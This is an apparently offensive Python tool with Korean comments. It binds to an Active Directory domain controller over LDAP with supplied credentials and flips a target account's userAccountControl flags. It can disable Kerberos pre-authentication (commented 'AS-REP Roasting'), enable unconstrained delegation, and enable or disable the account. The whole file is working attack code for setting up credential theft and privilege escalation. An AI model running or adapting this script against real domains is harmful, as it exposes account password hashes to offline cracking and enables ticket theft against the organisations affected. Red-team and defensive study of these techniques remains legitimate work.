#!/usr/bin/env python3
import ldap, argparse, sys

# userAccountControl 비트값
DONT_REQ_PREAUTH        = 0x00400000   # AS-REP Roasting
ACCOUNTDISABLE          = 0x00000002   # 계정 비활성
TRUSTED_FOR_DELEGATION  = 0x00080000   # Unconstrained Delegation ← NEW

parser = argparse.ArgumentParser(
    description="Modify userAccountControl flags (AS-REP, Disable/Enable, Delegation)"
)
parser.add_argument("-dc-ip", required=True, help="Domain Controller IP")
parser.add_argument("-d", "--domain", required=True, help="Domain (contoso.com)")
parser.add_argument("-u", required=True, help="Username with write permission")
parser.add_argument("-p", required=True, help="Password")
parser.add_argument("--target", required=True, help="Target sAMAccountName")

# 옵션들
parser.add_argument("--asrep", choices=["enable", "disable"],
                    help="enable/disable DONT_REQ_PREAUTH")
parser.add_argument("--delegation", choices=["enable", "disable"],
                    help="enable/disable TRUSTED_FOR_DELEGATION")
dg = parser.add_mutually_exclusive_group()
dg.add_argument("--disable", action="store_true", help="Disable account")
dg.add_argument("--enable",  action="store_true", help="Enable account")

args = parser.parse_args()

LDAP_SERVER = f"ldap://{args.dc_ip}"
BIND_DN     = f"{args.u}@{args.domain}"
BASE_DN     = ",".join(f"DC={p}" for p in args.domain.split("."))
TARGET_USER = args.target

try:
    conn = ldap.initialize(LDAP_SERVER)
    conn.set_option(ldap.OPT_REFERRALS, 0)
    conn.simple_bind_s(BIND_DN, args.p)
except ldap.LDAPError as e:
    print(f"[-] LDAP bind failed: {e}")
    sys.exit(1)

flt = f"(sAMAccountName={TARGET_USER})"
res = conn.search_s(BASE_DN, ldap.SCOPE_SUBTREE, flt,
                    ["distinguishedName", "userAccountControl"])
if not res:
    print("[-] Target not found.")
    sys.exit(1)

dn, attrs = res[0]
cur_uac = int(attrs["userAccountControl"][0].decode())
new_uac = cur_uac

# AS-REP
if   args.asrep == "enable":  new_uac |= DONT_REQ_PREAUTH
elif args.asrep == "disable": new_uac &= ~DONT_REQ_PREAUTH
# Delegation
if   args.delegation == "enable":  new_uac |= TRUSTED_FOR_DELEGATION
elif args.delegation == "disable": new_uac &= ~TRUSTED_FOR_DELEGATION
# 계정 활성/비활성
if args.disable: new_uac |=  ACCOUNTDISABLE
if args.enable:  new_uac &= ~ACCOUNTDISABLE

if new_uac == cur_uac:
    print("[*] No change requested -- already in desired state.")
    conn.unbind(); sys.exit(0)

try:
    conn.modify_s(dn, [(ldap.MOD_REPLACE, "userAccountControl",
                        str(new_uac).encode())])
    print(f"[+] {TARGET_USER} userAccountControl: {cur_uac} → {new_uac}")
except ldap.INSUFFICIENT_ACCESS:
    print("[-] Permission denied.")
except ldap.LDAPError as e:
    print(f"[-] LDAP error: {e}")
finally:
    conn.unbind()
